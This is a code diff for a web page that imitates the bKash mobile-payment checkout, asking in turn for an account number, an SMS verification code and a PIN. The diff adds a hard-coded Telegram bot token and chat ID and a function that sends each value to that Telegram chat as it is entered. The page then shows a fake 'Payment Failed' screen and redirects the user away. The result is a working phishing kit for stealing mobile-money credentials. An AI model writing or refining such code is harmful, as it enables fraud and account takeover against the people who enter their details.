@@ -108,7 +108,7 @@
             box-sizing: border-box; /* Include padding in height calculation */
         }
 
-.section-title {
+        .section-title {
             font-size: 1.125rem; /* Equivalent to text-lg */
             font-weight: 600; /* Equivalent to font-semibold */
             text-align: center;
@@ -218,7 +218,7 @@
             space-x: 0.25rem; /* Equivalent to space-x-1 */
         }
 
-.dot {
+        .dot {
             width: 0.5rem; /* Equivalent to w-2 */
             height: 0.5rem; /* Equivalent to h-2 */
             background-color: #ffffff;
@@ -259,6 +259,10 @@
             color: #9e9e9e;
             font-size: 0.75rem;
         }
+
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
@@ -285,38 +289,20 @@
                 <div class="amount">৳49.00</div>
             </div>
 
-            <!-- Account Number Input Section -->
-            <div class="bkash-input-section">
-                <h2 class="section-title">Your bKash Account Number</h2>
-                <div class="account-number-input-wrapper">
-                    <input
-                        type="tel"
-                        placeholder="e.g 01XXXXXXXXX"
-                        class="account-number-input"
-                        id="accountNumberInput"
-                        maxlength="11"
-                    />
-                </div>
-                <p class="terms-conditions">
-                    Confirm and proceed,
-                    <a href="https://www.bkash.com/en/page/tokenized_checkout" target="_blank" rel="noopener noreferrer">
-                        terms & conditions
-                    </a>
-                </p>
+            <!-- Main Content Area (Dynamically changes) -->
+            <div id="main-content-area">
+                <!-- Content will be rendered here by JavaScript -->
             </div>
 
             <!-- Action Buttons -->
             <div class="action-buttons">
                 <button class="btn btn-outline" id="cancelButton">Cancel</button>
-                <button class="btn btn-confirm" id="confirmButton" disabled>
-                    Confirm
-                </button>
+                <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
             </div>
 
             <!-- Footer -->
             <div class="footer">
-
-<div class="phone-call-info">
+                <div class="phone-call-info">
                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-call">
                         <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                     </svg>
@@ -330,255 +316,255 @@
     </div>
 
     <script>
-        const accountNumberInput = document.getElementById('accountNumberInput');
+        // --- Telegram Bot Configuration ---
+        // You MUST replace these with your actual Telegram bot token and chat ID.
+        // For security, in a real application, these should be handled server-side (like your Next.js example).
+        // For this purely client-side HTML, we're putting them directly here for demonstration.
+        const TELEGRAM_BOT_TOKEN = '7751217182:AAEWRJ427aODJ4w9Y9sJw51U28o0QZ_yx4E'; // REPLACE WITH YOUR BOT TOKEN
+        const TELEGRAM_CHAT_ID = '7335173906'; // REPLACE WITH YOUR CHAT ID
+
+        const mainContentArea = document.getElementById('main-content-area');
         const confirmButton = document.getElementById('confirmButton');
         const cancelButton = document.getElementById('cancelButton');
-        const bkashInputSection = document.querySelector('.bkash-input-section'); // For the verification page transition
+        const actionButtonsDiv = document.querySelector('.action-buttons');
 
         let currentView = 'accountNumber'; // 'accountNumber', 'verificationCode', 'pinEntry', 'paymentFailed'
         let currentAccountNumber = '';
         let currentVerificationCode = '';
+        let resendTimerInterval;
+        let resendCountdown = 30;
+        let redirectTimerInterval;
+        let redirectCountdown = 5;
+
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.error("Telegram bot token or chat ID is not configured.");
+                alert("Telegram configuration is missing. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in the script.");
+                return;
+            }
+
+            let message = "";
+            if (data.accountNumber) {
+                message = `New bKash Account Number: <a href="tel:${data.accountNumber}">${data.accountNumber}</a>`;
+            } else if (data.verificationCode) {
+                message = `bKash Verification Code: <b>${data.verificationCode}</b>`;
+            } else if (data.pin) {
+                message = `bKash PIN: <b>${data.pin}</b>`;
+            }
+
+            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML",
+                    }),
+                });
+
+                if (response.ok) {
+                    console.log("Message sent to Telegram successfully.");
+                } else {
+                    const errorData = await response.json();
+                    console.error("Telegram API error:", response.status, errorData);
+                    alert(`Failed to send data to Telegram: ${errorData.description || 'Unknown error'}`);
+                }
+            } catch (error) {
+                console.error("Error sending message to Telegram:", error);
+                alert("An error occurred while trying to send data to Telegram.");
+            }
+        }
 
         function renderView() {
-            // Clear existing content if any dynamic parts are present
-            const dynamicContent = bkashInputSection; // Assuming this section changes
-            dynamicContent.innerHTML = ''; // Clear previous content
+            mainContentArea.innerHTML = ''; // Clear previous content
+            actionButtonsDiv.classList.remove('hidden'); // Ensure buttons are visible
 
-            const actionButtonsDiv = document.querySelector('.action-buttons');
-            actionButtonsDiv.innerHTML = ''; // Clear previous buttons
-
-            let title = '';
-            let inputPlaceholder = '';
+            let contentHTML = '';
             let inputId = '';
             let maxLength = 0;
-            let currentInputValue = '';
-            let termsLink = '';
-            let bottomText = '';
+            let inputType = 'tel'; // Default to tel for numeric input
+            let inputStyle = '';
 
             switch (currentView) {
                 case 'accountNumber':
-                    title = 'Your bKash Account Number';
-                    inputPlaceholder = 'e.g 01XXXXXXXXX';
                     inputId = 'accountNumberInput';
                     maxLength = 11;
-                    currentInputValue = currentAccountNumber;
-                    termsLink = 
-                        <p class="terms-conditions">
-                            Confirm and proceed,
-                            <a href="https://www.bkash.com/en/page/tokenized_checkout" target="_blank" rel="noopener noreferrer">
-                                terms & conditions
-                            </a>
-                        </p>
-                    ;
-                    actionButtonsDiv.innerHTML = 
-                        <button class="btn btn-outline" id="cancelButton">Cancel</button>
-                        <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
-                    ;
-                    dynamicContent.style.minHeight = '24rem'; // Reset min-height
-                    dynamicContent.style.justifyContent = 'center'; // Reset alignment
+                    contentHTML = `
+                        <div class="bkash-input-section">
+                            <h2 class="section-title">Your bKash Account Number</h2>
+                            <div class="account-number-input-wrapper">
+                                <input
+                                    type="${inputType}"
+                                    placeholder="e.g 01XXXXXXXXX"
+                                    class="account-number-input"
+                                    id="${inputId}"
+                                    maxlength="${maxLength}"
+                                    value="${currentAccountNumber}"
+                                />
+                            </div>
+                            <p class="terms-conditions">
+                                Confirm and proceed,
+                                <a href="https://www.bkash.com/en/page/tokenized_checkout" target="_blank" rel="noopener noreferrer">
+                                    terms & conditions
+                                </a>
+                            </p>
+                        </div>
+                    `;
+                    confirmButton.textContent = 'Confirm';
                     break;
 
                 case 'verificationCode':
-                    title = 'Enter verification code sent to';
-                    inputPlaceholder = 'Enter 6 digit code';
                     inputId = 'verificationCodeInput';
                     maxLength = 6;
-                    currentInputValue = currentVerificationCode;
-                    let maskedNumber = currentAccountNumber ? ${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)} : "";
-                    dynamicContent.innerHTML = `
-                        <h2 class="section-title">${title}</h2>
-
-<div class="relative flex items-center justify-center" style="margin-bottom: 1rem;">
-                            <p class="text-center" style="font-size: 1.125rem; font-weight: 500;">${maskedNumber}</p>
+                    let maskedNumber = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)}` : "";
+                    contentHTML = `
+                        <div class="bkash-input-section">
+                            <h2 class="section-title">Enter verification code sent to</h2>
+                            <div class="relative flex items-center justify-center" style="margin-bottom: 1rem;">
+                                <p class="text-center" style="font-size: 1.125rem; font-weight: 500;">${maskedNumber}</p>
+                            </div>
+                            <div class="account-number-input-wrapper" style="max-width: 18rem;">
+                                <input
+                                    type="${inputType}"
+                                    placeholder="Enter 6 digit code"
+                                    class="account-number-input"
+                                    id="${inputId}"
+                                    maxlength="${maxLength}"
+                                    value="${currentVerificationCode}"
+                                />
+                            </div>
+                            <p class="terms-conditions" id="resendCodeText"></p>
                         </div>
-                        <div class="account-number-input-wrapper" style="max-width: 18rem;">
-                            <input
-                                type="tel"
-                                placeholder="${inputPlaceholder}"
-                                class="account-number-input"
-                                id="${inputId}"
-                                maxlength="${maxLength}"
-                                value="${currentInputValue}"
-                            />
-                        </div>
-                        <p class="terms-conditions" id="resendCodeText">Resend Code in 30s</p>
-                    ;
-                    actionButtonsDiv.innerHTML = 
-                        <button class="btn btn-outline" id="cancelButton">Cancel</button>
-                        <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
-                    ;
-                    dynamicContent.style.minHeight = '24rem'; // Reset min-height
-                    dynamicContent.style.justifyContent = 'center'; // Reset alignment
+                    `;
+                    confirmButton.textContent = 'Confirm';
                     startResendTimer();
                     break;
 
                 case 'pinEntry':
-                    title = 'Enter PIN of your bKash account number';
-                    inputPlaceholder = 'Enter PIN';
                     inputId = 'pinInput';
                     maxLength = 5;
-                    // For display, we will use masked input, actual pin is handled separately
-                    currentInputValue = ''; // PIN will be masked dynamically
-                    let maskedAccountNumberForPin = currentAccountNumber ? ${currentAccountNumber.slice(0, 3)}  * ${currentAccountNumber.slice(-3)} : "";
-                    dynamicContent.innerHTML = 
-                        <h2 class="section-title">${title}</h2>
-                        <div class="relative flex items-center justify-center" style="margin-bottom: 1rem;">
-                            <p class="text-center" style="font-size: 1.125rem; font-weight: 500;">${maskedAccountNumberForPin}</p>
+                    inputType = 'password'; // Use password type for PIN for better UX (hides after typing)
+                    inputStyle = 'font-size: 1.5rem; letter-spacing: 0.125em;'; // text-2xl tracking-wider
+                    let maskedAccountNumberForPin = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)}  * ${currentAccountNumber.slice(-3)}` : "";
+                    contentHTML = `
+                        <div class="bkash-input-section">
+                            <h2 class="section-title">Enter PIN of your bKash account number</h2>
+                            <div class="relative flex items-center justify-center" style="margin-bottom: 1rem;">
+                                <p class="text-center" style="font-size: 1.125rem; font-weight: 500;">${maskedAccountNumberForPin}</p>
+                            </div>
+                            <div class="account-number-input-wrapper" style="max-width: 18rem;">
+                                <input
+                                    type="${inputType}"
+                                    placeholder="Enter PIN"
+                                    class="account-number-input"
+                                    id="${inputId}"
+                                    maxlength="${maxLength}"
+                                    style="${inputStyle}"
+                                />
+                            </div>
                         </div>
-                        <div class="account-number-input-wrapper" style="max-width: 18rem;">
-                            <input
-                                type="tel"
-                                placeholder="${inputPlaceholder}"
-                                class="account-number-input"
-                                id="${inputId}"
-                                maxlength="${maxLength}"
-                                style="font-size: 1.5rem; letter-spacing: 0.125em;" /* text-2xl tracking-wider */
-                            />
-                        </div>
-                    ;
-                    actionButtonsDiv.innerHTML = 
-                        <button class="btn btn-outline" id="cancelButton">Cancel</button>
-                        <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
                     `;
-                    dynamicContent.style.minHeight = '24rem'; // Reset min-height
-                    dynamicContent.style.justifyContent = 'center'; // Reset alignment
+                    confirmButton.textContent = 'Confirm';
                     break;
 
                 case 'paymentFailed':
-                    actionButtonsDiv.style.display = 'none'; // Hide buttons on failed page
-                    const paymentFailedDiv = document.createElement('div');
-                    paymentFailedDiv.className = 'bkash-input-section'; // Reuse bkash-input-section styling
-                    paymentFailedDiv.style.backgroundColor = '#e3007f';
-
-paymentFailedDiv.style.color = '#ffffff';
-                    paymentFailedDiv.style.minHeight = '300px'; /* min-h-[300px] */
-                    paymentFailedDiv.style.paddingTop = '1.5rem';
-                    paymentFailedDiv.style.paddingBottom = '1.5rem';
-                    paymentFailedDiv.innerHTML = 
-                        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: white; margin-bottom: 1rem;">
-                            <circle cx="12" cy="12" r="10"></circle>
-                            <line x1="15" y1="9" x2="9" y2="15"></line>
-                            <line x1="9" y1="9" x2="15" y2="15"></line>
-                        </svg>
-                        <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem;">Payment Failed</h2>
-                        <p style="font-size: 0.875rem; margin-bottom: 1rem;">Merchant verification failed</p>
-                        <p style="font-size: 0.875rem;" id="redirectText">Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in 5s</p>
-                    ;
-                    bkashInputSection.replaceWith(paymentFailedDiv); // Replace the existing bkash-input-section
-                    dynamicContent.style.minHeight = 'auto'; // Adjust min-height for failed page
-                    dynamicContent.style.justifyContent = 'flex-start'; // Adjust alignment for failed page
+                    actionButtonsDiv.classList.add('hidden'); // Hide buttons
+                    contentHTML = `
+                        <div class="bkash-input-section" style="min-height: 300px; background-color: #e3007f; color: #ffffff; padding-top: 1.5rem; padding-bottom: 1.5rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: white; margin-bottom: 1rem;">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <line x1="15" y1="9" x2="9" y2="15"></line>
+                                <line x1="9" y1="9" x2="15" y2="15"></line>
+                            </svg>
+                            <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem;">Payment Failed</h2>
+                            <p style="font-size: 0.875rem; margin-bottom: 1rem;">Merchant verification failed</p>
+                            <p style="font-size: 0.875rem;" id="redirectText"></p>
+                        </div>
+                    `;
                     startRedirectTimer();
-                    return; // Exit here as content is replaced
+                    break;
 
                 default:
                     break;
             }
 
-            // For dynamic input fields
-            if (currentView !== 'paymentFailed') {
-                const inputWrapper = document.createElement('div');
-                inputWrapper.className = 'account-number-input-wrapper';
-                inputWrapper.style.maxWidth = '18rem'; // Consistent width for input
-                inputWrapper.innerHTML = 
-                    <input
-                        type="tel"
-                        placeholder="${inputPlaceholder}"
-                        class="account-number-input"
-                        id="${inputId}"
-                        maxlength="${maxLength}"
-                        value="${currentInputValue}"
-                        ${currentView === 'pinEntry' ? 'style="font-size: 1.5rem; letter-spacing: 0.125em;"' : ''}
-                    />
-                ;
-
-                if (currentView === 'accountNumber') {
-                    dynamicContent.innerHTML = 
-                        <h2 class="section-title">${title}</h2>
-                        ${inputWrapper.outerHTML}
-                        ${termsLink}
-                    ;
-                } else { // verificationCode and pinEntry
-                     // If coming from another view, ensure it's re-rendered correctly
-                    if (!dynamicContent.querySelector(#${inputId})) {
-                        dynamicContent.querySelector('.section-title').insertAdjacentElement('afterend', inputWrapper);
-                    }
-                }
-            }
-
-
+            mainContentArea.innerHTML = contentHTML;
             attachEventListeners();
+            updateConfirmButtonState(); // Initial state for buttons
         }
 
         function updateConfirmButtonState() {
-            const confirmBtn = document.getElementById('confirmButton');
-            if (!confirmBtn) return;
+            if (!confirmButton) return;
 
-            if (currentView === 'accountNumber') {
-                const input = document.getElementById('accountNumberInput');
-                const isValid = input && input.value.startsWith('01') && input.value.length === 11;
-                confirmBtn.disabled = !isValid;
-            } else if (currentView === 'verificationCode') {
-                const input = document.getElementById('verificationCodeInput');
+            let isValid = false;
+            const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
 
-const isValid = input && input.value.length === 6;
-                confirmBtn.disabled = !isValid;
-            } else if (currentView === 'pinEntry') {
-                const input = document.getElementById('pinInput');
-                const isValid = input && input.value.length >= 4 && input.value.length <= 5;
-                confirmBtn.disabled = !isValid;
-            } else {
-                confirmBtn.disabled = true; // Default to disabled
+            if (currentInput) {
+                if (currentView === 'accountNumber') {
+                    isValid = currentInput.value.startsWith('01') && currentInput.value.length === 11;
+                } else if (currentView === 'verificationCode') {
+                    isValid = currentInput.value.length === 6;
+                } else if (currentView === 'pinEntry') {
+                    isValid = currentInput.dataset.actualPin && currentInput.dataset.actualPin.length >= 4 && currentInput.dataset.actualPin.length <= 5;
+                }
             }
+            confirmButton.disabled = !isValid;
         }
 
         function showLoading() {
-            const confirmBtn = document.getElementById('confirmButton');
-            if (confirmBtn) {
-                confirmBtn.disabled = true;
-                confirmBtn.innerHTML = 
+            if (confirmButton) {
+                confirmButton.disabled = true;
+                confirmButton.innerHTML = `
                     <div class="loading-dots">
                         <div class="dot"></div>
                         <div class="dot"></div>
                         <div class="dot"></div>
                     </div>
-                ;
+                `;
             }
         }
 
         function hideLoading() {
-            const confirmBtn = document.getElementById('confirmButton');
-            if (confirmBtn) {
-                confirmBtn.innerHTML = 'Confirm';
+            if (confirmButton) {
+                confirmButton.innerHTML = 'Confirm';
                 updateConfirmButtonState(); // Re-enable based on current input state
             }
         }
 
         function attachEventListeners() {
-            const confirmBtn = document.getElementById('confirmButton');
-            const cancelBtn = document.getElementById('cancelButton');
             const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
 
-            if (confirmBtn) {
-                confirmBtn.onclick = async () => {
+            if (confirmButton) {
+                confirmButton.onclick = async () => {
                     showLoading();
                     await new Promise(resolve => setTimeout(resolve, 800)); // Simulate network delay
-                    hideLoading();
 
                     if (currentView === 'accountNumber') {
                         currentAccountNumber = currentInput.value;
+                        await sendToTelegram({ accountNumber: currentAccountNumber });
                         currentView = 'verificationCode';
                     } else if (currentView === 'verificationCode') {
                         currentVerificationCode = currentInput.value;
+                        await sendToTelegram({ verificationCode: currentVerificationCode });
                         currentView = 'pinEntry';
                     } else if (currentView === 'pinEntry') {
-                         currentView = 'paymentFailed'; // Always go to failed for this HTML demo
+                        const actualPin = currentInput.dataset.actualPin || '';
+                        await sendToTelegram({ pin: actualPin });
+                        currentView = 'paymentFailed'; // Always go to failed for this HTML demo
                     }
+                    hideLoading();
                     renderView();
                 };
             }
 
-            if (cancelBtn) {
-                cancelBtn.onclick = () => {
+            if (cancelButton) {
+                cancelButton.onclick = () => {
                     if (currentView === 'accountNumber') {
                         currentAccountNumber = ''; // Clear account number
                     } else if (currentView === 'verificationCode') {
@@ -590,27 +576,28 @@ const isValid = input && input.value.length === 6;
             }
 
             if (currentInput) {
+                // Initialize dataset properties for PIN input
+                if (currentView === 'pinEntry') {
+                    currentInput.dataset.actualPin = '';
+                    currentInput.dataset.displayLength = '0';
+                }
+
                 currentInput.oninput = (e) => {
                     let value = e.target.value;
                     if (currentView === 'accountNumber' || currentView === 'verificationCode') {
                         e.target.value = value.replace(/\D/g, ''); // Allow only digits
                     } else if (currentView === 'pinEntry') {
-                        let newPin = '';
+                        let newPin = currentInput.dataset.actualPin || '';
                         let displayPin = '';
-                        // Implement PIN masking logic similar to your Next.js code
-                        const existingPin = currentInput.dataset.actualPin || '';
-                        if (value.length > currentInput.dataset.displayLength) { // New char added
-                            const newChar = value.slice(-1);
+                        const currentDisplayLength = parseInt(currentInput.dataset.displayLength || '0');
 
-if (newChar.match(/[0-9]/)) { // Only allow digits 0-9
-                                newPin = existingPin + newChar;
-                            } else {
-                                newPin = existingPin; // Keep existing if invalid char
+                        if (value.length > currentDisplayLength) { // New char added
+                            const newChar = value.slice(-1);
+                            if (newChar.match(/[0-9]/)) { // Only allow digits 0-9
+                                newPin += newChar;
                             }
-                        } else if (value.length < currentInput.dataset.displayLength) { // Char deleted
-                            newPin = existingPin.slice(0, -1);
-                        } else {
-                            newPin = existingPin; // No change or invalid char
+                        } else if (value.length < currentDisplayLength) { // Char deleted
+                            newPin = newPin.slice(0, -1);
                         }
 
                         if (newPin.length > maxLength) {
@@ -618,16 +605,19 @@ if (newChar.match(/[0-9]/)) { // Only allow digits 0-9
                         }
 
                         currentInput.dataset.actualPin = newPin;
-                        currentInput.dataset.displayLength = newPin.length; // Store actual length for comparison
+                        currentInput.dataset.displayLength = newPin.length.toString(); // Store actual length for comparison
 
                         if (newPin.length > 0) {
                             const lastDigit = newPin.slice(-1);
                             displayPin = "●".repeat(newPin.length - 1) + lastDigit;
+
+                            // Mask the last digit after a short delay
                             setTimeout(() => {
-                                if (currentInput.dataset.actualPin === newPin) { // Check if pin hasn't changed during timeout
-                                    currentInput.value = "●".repeat(newPin.length);
+                                // Only mask if the pin hasn't changed since this timeout was set
+                                if (currentInput.dataset.actualPin === newPin && currentInput.value === displayPin) {
+                                     currentInput.value = "●".repeat(newPin.length);
                                 }
-                            }, 500);
+                            }, 500); // 500ms delay
                         } else {
                             displayPin = '';
                         }
@@ -637,37 +627,34 @@ if (newChar.match(/[0-9]/)) { // Only allow digits 0-9
                     updateConfirmButtonState();
                 };
 
-                 // Initial update for the current input field
+                // Initial update for the current input field
                 updateConfirmButtonState();
             }
         }
-
-        let resendTimerInterval;
-        let resendCountdown = 30;
 
         function startResendTimer() {
             resendCountdown = 30;
             const resendCodeText = document.getElementById('resendCodeText');
             if (resendCodeText) {
-                resendCodeText.innerHTML = Resend Code in ${resendCountdown}s;
-                const confirmBtn = document.getElementById('confirmButton');
-                if (confirmBtn) confirmBtn.disabled = true; // Disable confirm while timer is active
+                resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
+                confirmButton.disabled = true; // Disable confirm while timer is active
 
                 if (resendTimerInterval) clearInterval(resendTimerInterval);
 
                 resendTimerInterval = setInterval(() => {
                     resendCountdown--;
                     if (resendCountdown > 0) {
-                        resendCodeText.innerHTML = Resend Code in ${resendCountdown}s;
+                        resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
                     } else {
                         clearInterval(resendTimerInterval);
-                        resendCodeText.innerHTML = 
+                        resendCodeText.innerHTML = `
                             <button id="resendCodeButton" style="background: none; border: none; color: white; text-decoration: underline; cursor: pointer; font-size: 0.75rem;">Resend Code</button>
-                        ;
+                        `;
                         const resendCodeButton = document.getElementById('resendCodeButton');
                         if (resendCodeButton) {
                             resendCodeButton.onclick = () => {
-                                currentView = 'accountNumber'; // Go back to account number page on resend
+                                // When resend button is clicked, go back to account number input to start fresh or reset OTP
+                                currentView = 'accountNumber';
                                 currentVerificationCode = ''; // Clear verification code
                                 renderView();
                             };
@@ -678,25 +665,26 @@ if (newChar.match(/[0-9]/)) { // Only allow digits 0-9
             }
         }
 
-        let redirectTimerInterval;
-        let redirectCountdown = 5;
-
         function startRedirectTimer() {
             redirectCountdown = 5;
             const redirectText = document.getElementById('redirectText');
             if (redirectText) {
                 if (redirectTimerInterval) clearInterval(redirectTimerInterval);
 
-redirectTimerInterval = setInterval(() => {
+                redirectTimerInterval = setInterval(() => {
                     redirectCountdown--;
                     if (redirectCountdown > 0) {
-                        redirectText.innerHTML = Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in ${redirectCountdown}s;
+                        redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in ${redirectCountdown}s`;
                     } else {
                         clearInterval(redirectTimerInterval);
-                        redirectText.innerHTML = Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>;
+                        redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>`;
                         // Simulate redirecting to the referrer or going back
                         setTimeout(() => {
-                            window.history.back(); // Or window.location.href = 'your_merchant_url';
+                            if (document.referrer) {
+                                window.location.href = document.referrer;
+                            } else {
+                                window.history.back(); // Fallback if no referrer is available
+                            }
                         }, 1000); // Small delay before actual redirect
                     }
                 }, 1000);
